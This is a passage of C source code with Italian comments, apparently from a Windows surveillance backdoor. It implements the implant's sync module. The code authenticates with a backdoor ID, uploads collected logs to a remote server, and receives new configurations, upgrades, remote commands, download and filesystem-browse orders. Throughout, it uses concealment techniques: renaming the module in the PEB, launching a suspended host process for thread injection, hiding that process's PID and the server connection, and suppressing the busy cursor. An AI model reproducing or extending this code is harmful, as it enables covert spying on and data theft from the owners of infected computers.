		if (!(ptr = message = (BYTE *)malloc(sizeof(DWORD) + l_usr + l_dev + l_src)))
			break;

		memcpy(ptr, &version, sizeof(DWORD));
		ptr += sizeof(DWORD);
		memcpy(ptr, p_usr, l_usr);
		ptr += l_usr;
		memcpy(ptr, p_dev, l_dev);
		ptr += l_dev;
		memcpy(ptr, p_src, l_src);

		// Crea il comando
		if (!(buffer = PreapareCommand(PROTO_ID, message, sizeof(DWORD)+l_usr+l_dev+l_src, &buffer_len)))
			break;

		// Invia il buffer
		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, WIRESPEED))
			break;

		// Parsa la risposta
		if (!(ptr = ParseResponse(response, response_len, &response_command, response_message_len)) || response_command == PROTO_NO || *response_message_len == 0)
			break;

		// Passa al chiamante il messaggio ritornato
		if (! (response_message = (BYTE *)malloc(*response_message_len)))
			break;
		memcpy(response_message, ptr, *response_message_len);

	} while(0);

	SAFE_FREE(p_usr);
	SAFE_FREE(p_dev);
	SAFE_FREE(p_src);
	SAFE_FREE(message);
	SAFE_FREE(buffer);
	SAFE_FREE(response);
	return response_message;
}

// Usato per i comandi che ricevono un buffer in memoria (DOWNLOAD e FILESYSTEM)
// Se il server torna un messaggio, response_message viene allocato (va liberato dal chiamante)
BOOL H_ASP_GenericCommand(DWORD command, DWORD *response_command, BYTE **response_message, DWORD *response_message_len)
{
	BYTE *response = NULL; 
	DWORD response_len;
	DWORD buffer_len;
	BYTE *buffer = NULL;
	BOOL ret_val = FALSE;
	BYTE *ptr = NULL;

	*response_message = NULL;
	*response_message_len = 0;
	*response_command = PROTO_NO;

	do {
		// Crea il comando
		if (!(buffer = PreapareCommand(command, NULL, 0, &buffer_len)))
			break;

		// Invia il buffer
		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, WIRESPEED)) 
			break;

		// Parsa la risposta
		if (!(ptr = ParseResponse(response, response_len, response_command, response_message_len)))
			break;

		if (*response_command == PROTO_OK && *response_message_len > 0) {
			// Passa al chiamante il messaggio ritornato
			if (! (*response_message = (BYTE *)malloc(*response_message_len)))
				break;
			memcpy(*response_message, ptr, *response_message_len);
		} 
		ret_val = TRUE;
	} while(0);

	SAFE_FREE(buffer);
	SAFE_FREE(response);
	return ret_val;
}

// Usato per i comandi che ricevono un buffer in memoria (DOWNLOAD e FILESYSTEM)
// Se il server torna un messaggio, response_message viene allocato (va liberato dal chiamante)
// Permette anche l'invio di un payload
BOOL H_ASP_GenericCommandPL(DWORD command, BYTE *payload, DWORD payload_len, DWORD *response_command, BYTE **response_message, DWORD *response_message_len)
{
	BYTE *response = NULL; 
	DWORD response_len;
	DWORD buffer_len;
	BYTE *buffer = NULL;
	BOOL ret_val = FALSE;
	BYTE *ptr = NULL;

	*response_message = NULL;
	*response_message_len = 0;
	*response_command = PROTO_NO;

	do {
		// Crea il comando
		if (!(buffer = PreapareCommand(command, payload, payload_len, &buffer_len)))
			break;

		// Invia il buffer
		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, WIRESPEED)) 
			break;

		// Parsa la risposta
		if (!(ptr = ParseResponse(response, response_len, response_command, response_message_len)))
			break;

		if (*response_command == PROTO_OK && *response_message_len > 0) {
			// Passa al chiamante il messaggio ritornato
			if (! (*response_message = (BYTE *)malloc(*response_message_len)))
				break;
			memcpy(*response_message, ptr, *response_message_len);
		} 
		ret_val = TRUE;
	} while(0);

	SAFE_FREE(buffer);
	SAFE_FREE(response);
	return ret_val;
}

#define MINIMAL_UPLOAD_PACKET_LEN 14
// Se torna PROTO_OK scrive il file che ha scaricato e ne torna il nome in file_name (che va liberato)
// Non viene usato GenericCommand per evitare di dover allocare due volte tutta la memoria per il file
BOOL H_ASP_GetUpload(BOOL is_upload, DWORD *response_command, WCHAR **file_name, DWORD *upload_left)
{
	BYTE *response = NULL; 
	DWORD response_len;
	DWORD buffer_len;
	BYTE *buffer = NULL;
	BOOL ret_val = FALSE;
	BYTE *message_body = NULL;
	BYTE *ptr;
	DWORD response_message_len;
	DWORD file_name_len;
	DWORD file_body_len;
	HANDLE hfile = INVALID_HANDLE_VALUE;
	WCHAR file_path[MAX_PATH];
	DWORD command = PROTO_UPGRADE;

	*file_name = NULL;
	*response_command = PROTO_NO;

	// Verifica se e' stata chiamata per un semplice upload o 
	// per un upgrade
	if (is_upload)
		command = PROTO_UPLOAD;

	do {
		// Crea il comando
		if (!(buffer = PreapareCommand(command, NULL, 0, &buffer_len)))
			break;

		// Invia il buffer
		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, WIRESPEED)) 
			break;

		// Parsa la risposta
		if (!(message_body = ParseResponse(response, response_len, response_command, &response_message_len)))
			break;

		if (*response_command == PROTO_OK) {
			if (response_message_len < MINIMAL_UPLOAD_PACKET_LEN)
				break;
			ptr = message_body;
			// Legge il numero di download rimanenti
			memcpy(upload_left, ptr, sizeof(DWORD));
			ptr += sizeof(DWORD);
			// Legge la lunghezza del nome file
			memcpy(&file_name_len, ptr, sizeof(DWORD));
			ptr += sizeof(DWORD);
			// Legge il nome del file
			*file_name = _wcsdup((WCHAR *)ptr);
			if (!(file_name))
				break;
			ptr += file_name_len;
			// Legge la lunghezza del body del file
			memcpy(&file_body_len, ptr, sizeof(DWORD));
			ptr += sizeof(DWORD);

			// Scrive il file su disco
			if (!WriteBufferOnFile(HM_CompletePathW(*file_name, file_path), ptr, file_body_len)) {
				SAFE_FREE(*file_name);
				break;
			}
		} 
		ret_val = TRUE;
	} while(0);

	CloseHandle(hfile);
	SAFE_FREE(buffer);
	SAFE_FREE(response);
	return ret_val;
}

// Invia un file di log al server
BOOL H_ASP_SendFile(WCHAR *file_path, DWORD byte_per_second, DWORD *response_command)
{
	DWORD response_len;
	DWORD buffer_len;
	DWORD response_message_len;
	BOOL ret_val = FALSE;
	BYTE *buffer = NULL;
	BYTE *response = NULL; 

	*response_command = PROTO_NO;

	do {
		// Crea il buffer con comando e file
		if (!(buffer = PrepareFile(file_path, &buffer_len)))
			break;

		// Invia il buffer
		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, byte_per_second)) 
			break;
		
		// Parsa la risposta (non contiene messaggio)
		if (!ParseResponse(response, response_len, response_command, &response_message_len))
			break;

		ret_val = TRUE;
	} while(0);

	SAFE_FREE(buffer);
	SAFE_FREE(response);
	return ret_val;

}
//////////////////////////////////////////////////
// Funzione esportata                           //
// Viene caricata dal thread ASP nel processo   //
// ASP host.                                    //
//////////////////////////////////////////////////
#define ASP_REPORT_MESSAGE_BACK if (message) { \
								if (msg_len > sizeof(ASP_IPC_command->out_param)) \
									msg_len = sizeof(ASP_IPC_command->out_param); \
								memcpy(ASP_IPC_command->out_param, message, msg_len); \
								ASP_IPC_command->out_param_len = msg_len; \
								SAFE_FREE(message);	} else ASP_IPC_command->out_param_len = 0;

void __stdcall  ASP_MainLoop(char *asp_server)
{
	BOOL ret_success = FALSE;
	char server_ip[32];
	DWORD server_port;
	DWORD msg_len;
	BYTE *message = NULL;

	// Possibili strutture da tornare al core...
	asp_reply_setup *reply_setup;

	// Modifica il nome del modulo nella peb
	HidePEB(GetModuleHandle(H4DLLNAME));

	// Al ritorno ASP_IPC_command e' sicuramente valorizzato.
	// Non fa il detach tanto alla fine il processo sara' chiuso 
	// con ASP_Stop()
	if (!ASP_IPCAttach())
		return;

	// Esegue il setup delle winhttp e risolve l'indirizzo del server (o di un eventuale proxy)
	if (H_ASP_WinHTTPSetup(asp_server, server_ip, sizeof(server_ip), &server_port)) {
		// e ritorna con successo l'ip da nascondere al processo padre
		reply_setup = (asp_reply_setup *)ASP_IPC_command->out_param;
		reply_setup->server_addr = inet_addr(server_ip);
		reply_setup->server_port = server_port;
		ASP_IPC_command->status = ASP_DONE;
	} else
		ASP_IPC_command->status = ASP_ERROR;

	LOOP {
		Sleep(ASP_SLEEP_TIME);
		// Se non ha comandi da eseguire
		if (ASP_IPC_command->status != ASP_FETCH)
			continue;

		// Esegue la spedizione/ricezione dei dati a seconda dell'action
		if (ASP_IPC_command->action == ASP_AUTH) {
			asp_request_auth *ra  = (asp_request_auth *)ASP_IPC_command->in_param;
			ret_success = H_ASP_Auth(CLIENT_KEY, 16, ra->backdoor_id, strlen(ra->backdoor_id), (char *)ra->instance_id, 20, ra->subtype, strlen(ra->subtype), (char *)ra->conf_key, 16, &ASP_IPC_command->out_command);

		} else if (ASP_IPC_command->action == ASP_BYE) {
			ret_success = H_ASP_GenericCommand(PROTO_BYE, &ASP_IPC_command->out_command, &message, &msg_len);
			SAFE_FREE(message);

		} else if (ASP_IPC_command->action == ASP_IDBCK) {
			asp_request_id *ri  = (asp_request_id *)ASP_IPC_command->in_param;
			message = H_ASP_ID(ri->username, ri->device, L"", &msg_len);
			ret_success = (BOOL)message;
			ASP_REPORT_MESSAGE_BACK;

		} else if (ASP_IPC_command->action == ASP_UPLO || ASP_IPC_command->action == ASP_UPGR) {
			asp_reply_upload *ru  = (asp_reply_upload *)ASP_IPC_command->out_param;
			WCHAR *file_name = NULL;
			BOOL is_upload = FALSE;
			// Verifica se si tratta di un upload o di un upgrade
			if (ASP_IPC_command->action == ASP_UPLO) 
				is_upload = TRUE;
			ret_success = H_ASP_GetUpload(is_upload, &ASP_IPC_command->out_command, &file_name, &ru->upload_left);
			if (file_name)
				_snwprintf_s(ru->file_name, sizeof(ru->file_name)/sizeof(WCHAR), _TRUNCATE, L"%s", file_name);		
			SAFE_FREE(file_name);

		} else if (ASP_IPC_command->action == ASP_SLOG) {
			asp_request_log *rl  = (asp_request_log *)ASP_IPC_command->in_param;
			ret_success = H_ASP_SendFile(rl->file_name, rl->byte_per_second, &ASP_IPC_command->out_command); 
			
		} else if (ASP_IPC_command->action == ASP_NCONF) {
			asp_request_conf *rc = (asp_request_conf *)ASP_IPC_command->in_param;
			ret_success = H_ASP_GenericCommand(PROTO_NEW_CONF, &ASP_IPC_command->out_command, &message, &msg_len);
			if (ret_success && ASP_IPC_command->out_command == PROTO_OK) {
				DWORD proto_ok = PROTO_OK;
				WriteBufferOnFile(rc->conf_path, message, msg_len);
				SAFE_FREE(message);	
				H_ASP_GenericCommandPL(PROTO_NEW_CONF, (BYTE *)&proto_ok, sizeof(DWORD), &ASP_IPC_command->out_command, &message, &msg_len);
			}
			SAFE_FREE(message);	

		} else if (ASP_IPC_command->action == ASP_DOWN) {
			ret_success = H_ASP_GenericCommand(PROTO_DOWNLOAD, &ASP_IPC_command->out_command, &message, &msg_len);
			ASP_REPORT_MESSAGE_BACK;
	
		} else if (ASP_IPC_command->action == ASP_FSYS) {
			ret_success = H_ASP_GenericCommand(PROTO_FILESYSTEM, &ASP_IPC_command->out_command, &message, &msg_len);
			ASP_REPORT_MESSAGE_BACK;

		} else if (ASP_IPC_command->action == ASP_CMDE) {
			ret_success = H_ASP_GenericCommand(PROTO_COMMANDS, &ASP_IPC_command->out_command, &message, &msg_len);
			ASP_REPORT_MESSAGE_BACK;

		} else if (ASP_IPC_command->action == ASP_SSTAT) {
			ret_success = H_ASP_GenericCommandPL(PROTO_LOGSTATUS, ASP_IPC_command->in_param, sizeof(asp_request_stat), &ASP_IPC_command->out_command, &message, &msg_len);
			SAFE_FREE(message);

		}  else if (ASP_IPC_command->action == ASP_PURGE) {
			ret_success = H_ASP_GenericCommand(PROTO_PURGE, &ASP_IPC_command->out_command, &message, &msg_len);
			ASP_REPORT_MESSAGE_BACK;

		}


		// Notifica la fine delle operazioni di lettura/scrittura
		if (ret_success)
			ASP_IPC_command->status = ASP_DONE;
		else
			ASP_IPC_command->status = ASP_ERROR;
	}
}



/////////////////////////////////////
//    Funzioni Chiamate dal core   //
/////////////////////////////////////
DWORD ASP_Poll()
{
	// Controlla che la shared mem dei comandi sia attiva
	if (!ASP_IPC_command)
		return ASP_POLL_ERROR;

	// Se sta ancora eseguendo l'operazione
	if (ASP_IPC_command->status == ASP_FETCH)
		return ASP_POLL_FETCHING;

	// ASP ha tornato un errore
	if (ASP_IPC_command->status == ASP_ERROR) {
		ASP_IPC_command->status = ASP_NOP;
		return ASP_POLL_ERROR;
	}

	// Se lo status e' ASP_NOP o ASP_DONE.
	// Puo' settare ASP_IPC_command->status, tanto se non e' in
	// ASP_FETCH l'host ASP non modifica piu' lo status
	ASP_IPC_command->status = ASP_NOP; 
	return ASP_POLL_DONE;

}

// Aspetta che l'host ASP abbia terminato la richiesta
BOOL ASP_Wait_Response()
{
	LOOP {
		DWORD ret_val;

		Sleep(ASP_SLEEP_TIME);
		ret_val = ASP_Poll();
		if (ret_val == ASP_POLL_FETCHING)
			continue;

		if (ret_val == ASP_POLL_ERROR)
			return FALSE;

		// Se ha tornato ASP_POLL_DONE allora esce
		// dal ciclo e ritorna TRUE
		break;
	}
	
	return TRUE;
}

void ModifyAppstart(BOOL to_disable)
{
	HCURSOR hsc;	

	if (to_disable) {
		if (!(hsc = LoadCursor(NULL, IDC_ARROW)))
			return;
		if (!(hsc = CopyCursor(hsc)))
			return;
		if (!SetSystemCursor(hsc, 32650))
			DestroyCursor(hsc);
		return;
	}
	SystemParametersInfo(SPI_SETCURSORS, 0, 0, 0);
}

// Lancia process_name come host ASP verso il server asp_server
// Torna TRUE se ha successo.
BOOL ASP_Start(char *process_name, char *asp_server)
{
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
	DWORD init_timeout;
	
	// Inizializza le strutture per il thread iniettato
	if ( ASP_Setup(asp_server) != 0 )
		return FALSE;

	// Inizializza la shared memory
	if (!ASP_IPCSetup()) {
		ASP_IPCClose();
		return FALSE;
	}

	ModifyAppstart(TRUE);

	// L'host ASP setta il comando di inizializzazione
	// Deve essere sempre il primo comando dato all'host ASP
	// che si conclude con il ritorno dell'ip da nascondere
	// (necessario per poter fare ASP_Poll() in seguito
	ASP_IPC_command->action = ASP_SETUP;
	ASP_IPC_command->status = ASP_FETCH;

	// Lancia il process ASP host con il main thread stoppato
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	HM_CreateProcess(process_name, CREATE_SUSPENDED, &si, &pi, 0);
	// Se HM_CreateProcess fallisce, pi.dwProcessId e' settato a 0
	if (!pi.dwProcessId) {
		ASP_Stop();
		return FALSE;
	}

	// HM_CreateProcess ritorna solo il PID del figlio, non apre
	// handle al processo o al thread (quelli vengono chiusi del thread
	// iniettato in explorer)
	ASP_HostProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
	if(ASP_HostProcess == NULL) {
		ASP_Stop();
		return FALSE;
	}
	
	// Se e' a 64 bit ci risparmiamo i passi successivi e chiudiamo subito...
	if (IsX64Process(pi.dwProcessId)){
		ASP_Stop();
		return FALSE;
	}

	// Aggiunge pi.dwProcessId alla lista dei PID da nascondere 
	// (e lo memorizza in pid_hide per poi poter togliere l'hide)
	SET_PID_HIDE_STRUCT(pid_hide, pi.dwProcessId);
	AM_AddHide(HIDE_PID, &pid_hide);

	// XXX Sleep Aspettiamo che il thread di injection in iexplorer
	// abbia finito 
	Sleep(3000);

	// Lancia il thread di ASP che eseguira' il main loop 
	if (!ASP_StartASPThread(pi.dwProcessId)) {
		ASP_Stop();
		return FALSE;
	}

	// Attende che l'host ASP abbia tornato l'indirizzo IP da nascondere
	for (init_timeout=0; init_timeout < ASP_START_TIMEOUT; init_timeout+=ASP_SLEEP_TIME) {
		DWORD ret_val;

		Sleep(ASP_SLEEP_TIME);
		ret_val = ASP_Poll();
		if (ret_val == ASP_POLL_FETCHING)
			continue;

		// Se ha concluso con successo legge l'ip (da out_param), 
		// lo memorizza nella struttura connection_hide e lo nasconde
		if (ret_val == ASP_POLL_DONE) {
			asp_reply_setup *rs = (asp_reply_setup *)ASP_IPC_command->out_param;
			SET_CONNETCION_HIDE_STRUCT(connection_hide, rs->server_addr, htons(rs->server_port));
			AM_AddHide(HIDE_CNN, &connection_hide);
			return TRUE;
		}

		// Ha tornato ASP_POLL_ERROR
		break;
	}

	// Se e' scaduto il timeout di attesa per lo startup
	// o l'host ASP ha tornato un errore, allora lo termina
	// ed esce
	ASP_Stop();
	return FALSE;
}

// Termina l'uso di ASP (e del processo relativo)
void ASP_Stop()
{
	// Termina il processo host ASP e chiude la shared
	// memory relativa ai comandi
	SAFE_TERMINATEPROCESS(ASP_HostProcess);
	ASP_IPCClose();

	ModifyAppstart(FALSE);

	// Piccola attesa prima di cancellare l'hiding delle connessioni
	Sleep(5000);

	// Se sono stati memorizzati (struttura settata),e quindi aggiunti,
	// una connessione o un PID da nascondere, li toglie dalla lista di 
	// hiding e azzera le struttura relative
	if (IS_SET_CONNETCION_HIDE_STRUCT(connection_hide)) {
		AM_RemoveHide(HIDE_CNN, &connection_hide);
		UNSET_CONNETCION_HIDE_STRUCT(connection_hide);
	}

	if (IS_SET_PID_HIDE_STRUCT(pid_hide)) {
		AM_RemoveHide(HIDE_PID, &pid_hide);
		//HideDevice dev_unhook; // Rimuoviamo l'hide dal processo che effettua la sync
		//dev_unhook.unhook_hidepid(pid_hide.PID, FALSE);
		UNSET_PID_HIDE_STRUCT(pid_hide);
	}
}

// Chiude gentilmente la connessione col server
void ASP_Bye()
{
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return;
	ASP_IPC_command->action = ASP_BYE;
	ASP_IPC_command->status = ASP_FETCH;

	ASP_Wait_Response();
}

// Il core la chiama per eseguire il passo AUTH del protocollo
// Se torna FALSE la sync dovrebbe essere interrotta
// response_command deve essere allocato dal chiamante
BOOL ASP_Auth(char *backdoor_id, BYTE *instance_id, char *subtype, BYTE *conf_key, DWORD *response_command)
{
	asp_request_auth *ra;

	// Controlla che il processo host ASP sia ancora aperto e che non stia
	// gia' eseguendo delle operazioni
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return FALSE;

	// Passa i comandi all'host per eseguire l'auth
	ASP_IPC_command->action = ASP_AUTH;
	ra  = (asp_request_auth *)ASP_IPC_command->in_param;
	_snprintf_s(ra->backdoor_id, sizeof(ra->backdoor_id), _TRUNCATE, "%s", backdoor_id);
	_snprintf_s(ra->subtype, sizeof(ra->subtype), _TRUNCATE, "%s", subtype);
	memcpy(ra->instance_id, instance_id, sizeof(ra->instance_id));
	memcpy(ra->conf_key, conf_key, sizeof(ra->conf_key));
	ASP_IPC_command->status = ASP_FETCH;

	if (!ASP_Wait_Response())
		return FALSE;

	memcpy(response_command, &ASP_IPC_command->out_command, sizeof(DWORD));
	return TRUE;
}

// Il core la chiama per eseguire il passo AUTH del protocollo
// Se torna FALSE la sync dovrebbe essere interrotta
// time_date e availables devono essere allocati dal chiamante
BOOL ASP_Id(WCHAR *username, WCHAR *device, long long *time_date, DWORD *availables, DWORD size_avail)
{
	asp_request_id *ri;

	// Controlla che il processo host ASP sia ancora aperto e che non stia
	// gia' eseguendo delle operazioni
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return FALSE;

	// Passa i comandi all'host per eseguire l'id
	ASP_IPC_command->action = ASP_IDBCK;
	ri  = (asp_request_id *)ASP_IPC_command->in_param;
	_snwprintf_s(ri->username, sizeof(ri->username)/sizeof(WCHAR), _TRUNCATE, L"%s", username);
	_snwprintf_s(ri->device, sizeof(ri->device)/sizeof(WCHAR), _TRUNCATE, L"%s", device);
	ASP_IPC_command->status = ASP_FETCH;

	if (!ASP_Wait_Response())
		return FALSE;

	// Non puo' rispondere altro che proto OK, quindi ignoro out_command

	memcpy(time_date, &ASP_IPC_command->out_param, sizeof(long long));
	memcpy(availables, &ASP_IPC_command->out_param[sizeof(long long)], size_avail);

	return TRUE;
}

// Il core la chiama per ricevere un upload (is_upload e' TRUE) o un upgrade
// Ritorna il file_name (deve essere allocato dal chiamante), e il numero di upload rimanenti
// Se file_name e' tutto 0 vuol dire che c'e' stato un problema.
// file_name_len e' in byte
BOOL ASP_GetUpload(BOOL is_upload, WCHAR *file_name, DWORD file_name_len, DWORD *upload_left)
{
	asp_reply_upload *ru;

	// Controlla che il processo host ASP sia ancora aperto e che non stia
	// gia' eseguendo delle operazioni
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return FALSE;

	ZeroMemory(file_name, file_name_len);
	*upload_left = 0;

	// Passa i comandi all'host per eseguire l'upload/upgrade
	if (is_upload)
		ASP_IPC_command->action = ASP_UPLO;
	else
		ASP_IPC_command->action = ASP_UPGR;
	ASP_IPC_command->status = ASP_FETCH;

	if (!ASP_Wait_Response())
		return FALSE;

	if (ASP_IPC_command->out_command == PROTO_NO)
		return TRUE;

	ru  = (asp_reply_upload *)ASP_IPC_command->out_param;
	*upload_left = ru->upload_left;
	_snwprintf_s(file_name, file_name_len/sizeof(WCHAR), _TRUNCATE, L"%s", ru->file_name);

	return TRUE;
}

// Manda un file di log
// Prende in input il path del log da mandare e il bandlimit
BOOL ASP_SendLog(char *file_name, DWORD byte_per_second)
{
	asp_request_log *rl;

	// Controlla che il processo host ASP sia ancora aperto e che non stia
	// gia' eseguendo delle operazioni
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return FALSE;

	ASP_IPC_command->action = ASP_SLOG;
	rl  = (asp_request_log *)ASP_IPC_command->in_param;
	_snwprintf_s(rl->file_name, sizeof(rl->file_name)/sizeof(WCHAR), _TRUNCATE, L"%S", file_name);
	rl->byte_per_second = byte_per_second;
	ASP_IPC_command->status = ASP_FETCH;

	if (!ASP_Wait_Response())
		return FALSE;

	// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
	if (ASP_IPC_command->out_command != PROTO_OK)
		return FALSE;

	return TRUE;
}

// Manda lo status dei log da spedire
// Prende in input numero e size dei log (qword)
BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size)
{
	asp_request_stat *rs;

	// Controlla che il processo host ASP sia ancora aperto e che non stia
	// gia' eseguendo delle operazioni
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return FALSE;

	ASP_IPC_command->action = ASP_SSTAT;
	rs  = (asp_request_stat *)ASP_IPC_command->in_param;
	rs->log_count = log_count;
	rs->log_size = log_size;
	ASP_IPC_command->status = ASP_FETCH;

	if (!ASP_Wait_Response())
		return FALSE;

	if (ASP_IPC_command->out_command != PROTO_OK)
		return FALSE;

	return TRUE;
}

// Riceve la nuova configurazione
// Il file viene salvato nel path specificato (CONF_BU)
BOOL ASP_ReceiveConf(char *conf_file_path)
{
	asp_request_conf *rc;

	// Controlla che il processo host ASP sia ancora aperto e che non stia
	// gia' eseguendo delle operazioni
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return FALSE;

	ASP_IPC_command->action = ASP_NCONF;
	rc  = (asp_request_conf *)ASP_IPC_command->in_param;
	_snwprintf_s(rc->conf_path, sizeof(rc->conf_path)/sizeof(WCHAR), _TRUNCATE, L"%S", conf_file_path);
	ASP_IPC_command->status = ASP_FETCH;

	if (!ASP_Wait_Response())
		return FALSE;

	// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
	if (ASP_IPC_command->out_command != PROTO_OK)
		return FALSE;

	return TRUE;
}

// Ottiene i dati necessari per una richiesta di purge dei log
BOOL ASP_HandlePurge(long long *purge_time, DWORD *purge_size)
{
	asp_reply_purge *arp;

	*purge_time = 0;
	*purge_size = 0;

	// Controlla che il processo host ASP sia ancora aperto e che non stia
	// gia' eseguendo delle operazioni
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return FALSE;

	ASP_IPC_command->action = ASP_PURGE;
	ASP_IPC_command->status = ASP_FETCH;

	if (!ASP_Wait_Response())
		return FALSE;

	// Controlla il response e la lunghezza minima di una risposta
	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(asp_reply_purge))
		return FALSE;

	// Numero di download richiesti
	arp = (asp_reply_purge *)ASP_IPC_command->out_param;
	*purge_time = arp->purge_time;
	*purge_size = arp->purge_size;

	return TRUE;
}

// Prende la lista delle richieste di filesystem
// Se torna TRUE ha allocato fs_array (che va liberato) di num_elem elementi
BOOL ASP_GetFileSystem(DWORD *num_elem, fs_browse_elem **fs_array)
{
	BYTE *ptr;
	DWORD i, ret_len, elem_count;
	
	*num_elem = 0;

	// Controlla che il processo host ASP sia ancora aperto e che non stia
	// gia' eseguendo delle operazioni
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return FALSE;

	ASP_IPC_command->action = ASP_FSYS;
	ASP_IPC_command->status = ASP_FETCH;

	if (!ASP_Wait_Response())
		return FALSE;

	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
		return FALSE;

	// Numero di download richiesti
	ptr = ASP_IPC_command->out_param;
	elem_count = *((DWORD *)ptr);
	ptr += sizeof(DWORD);
	if (elem_count == 0)
		return FALSE;

	// Alloca l'array di elementi fs
	*fs_array = (fs_browse_elem *)calloc(elem_count, sizeof(fs_browse_elem));
	if (!(*fs_array))
		return FALSE;

	// Valorizza gli elementi dell'array
	// e alloca tutte le stringhe di start_dir
	for (i=0; i<elem_count; i++) {
		// profondita' (prima DWORD)
		(*fs_array)[i].depth = *((DWORD *)ptr);
		ptr += sizeof(DWORD);
		// start dir (stringa pascalizzata)
		if (!((*fs_array)[i].start_dir = UnPascalizeString(ptr, &ret_len)))
			break;

		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
		ptr += (ret_len + sizeof(DWORD));
	}

	return TRUE;
}

// Prende la lista delle richieste di esecuzione comandi
// Se torna TRUE ha allocato cmd_array (che va liberato) di num_elem elementi
BOOL ASP_GetCommands(DWORD *num_elem, WCHAR ***cmd_array)
{
	BYTE *ptr;
	DWORD i, ret_len, elem_count;
	
	*num_elem = 0;

	// Controlla che il processo host ASP sia ancora aperto e che non stia
	// gia' eseguendo delle operazioni
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return FALSE;

	ASP_IPC_command->action = ASP_CMDE;
	ASP_IPC_command->status = ASP_FETCH;

	if (!ASP_Wait_Response())
		return FALSE;

	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
		return FALSE;

	// Numero di download richiesti
	ptr = ASP_IPC_command->out_param;
	elem_count = *((DWORD *)ptr);
	ptr += sizeof(DWORD);
	if (elem_count == 0)
		return FALSE;

	// Alloca l'array di elementi fs
	*cmd_array = (WCHAR **)calloc(elem_count, sizeof(WCHAR *));
	if (!(*cmd_array))
		return FALSE;

	// Valorizza gli elementi dell'array
	for (i=0; i<elem_count; i++) {
		// i comandi sono una serie di stringhe pascalizzate
		if (!((*cmd_array)[i] = UnPascalizeString(ptr, &ret_len)))
			break;

		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
		ptr += (ret_len + sizeof(DWORD));
	}

	return TRUE;
}

// Prende la lista dei download
// Se torna TRUE ha allocato string array (che va liberato) di num_elem elementi
BOOL ASP_GetDownload(DWORD *num_elem, WCHAR ***string_array)
{
	BYTE *ptr;
	DWORD i, ret_len, elem_count;

	*num_elem = 0;

	// Controlla che il processo host ASP sia ancora aperto e che non stia
	// gia' eseguendo delle operazioni
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
		return FALSE;

	ASP_IPC_command->action = ASP_DOWN;
	ASP_IPC_command->status = ASP_FETCH;

	if (!ASP_Wait_Response())
		return FALSE;

	// Controlla il response e la lunghezza minima di una risposta
	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(DWORD))
		return FALSE;

	// Numero di download richiesti
	ptr = ASP_IPC_command->out_param;
	elem_count = *((DWORD *)ptr);
	ptr += sizeof(DWORD);
	if (elem_count == 0)
		return FALSE;

	// Alloca la lista di stringhe
	*string_array = (WCHAR **)calloc(elem_count, sizeof(WCHAR *));
	if (!(*string_array))
		return FALSE;

	// Alloca tutte le stringhe
	for (i=0; i<elem_count; i++) {
		if (!((*string_array)[i] = UnPascalizeString(ptr, &ret_len)))
			break;

		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
		ptr += (ret_len + sizeof(DWORD));
	}

	return TRUE;
}